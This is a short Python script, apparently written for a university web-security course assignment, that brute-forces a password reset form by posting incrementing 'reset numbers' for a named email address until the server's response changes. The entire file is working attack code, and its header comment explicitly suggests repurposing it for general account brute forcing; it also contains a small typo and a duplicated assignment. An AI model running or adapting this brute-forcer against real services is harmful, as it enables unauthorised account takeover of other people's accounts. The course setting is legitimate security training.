#!/usr/bin/python3

# This script was used for COMP6443 Break 2 Assignment to brute force
# a password reset functionality, which required the user the guess
# the 'reset number', which would then output the newly generated password
# upon input of the correct reset number in the form field.

# Re-purpose this script for general account brute forcing

import requests

url = 'https://dev.ns.agency/reset'

prev_data = None
resets = 0
while True:
	# retrieve current response
	payload = { 'dev-email': 'john-military@ns.agency', 'dev-resets': resets }
	response = requests.post(url, data=payload)
	curr_data = response.text
	# initial case
	if resets == 0:
		payload = payload = { 'dev-email': 'john-military@ns.agency', 'dev-resets': resets }
		respnse = requests.post(url, data=payload)
		prev_data = response.text
		resets += 1
		continue
	# successful reset num found
	if prev_data != curr_data:
		print("successful reset num = {}".format(resets))
		break
	# not successful reset, test next reset num
	else:
		print("reset: {}".format(resets))
		prev_data = curr_data
		resets += 1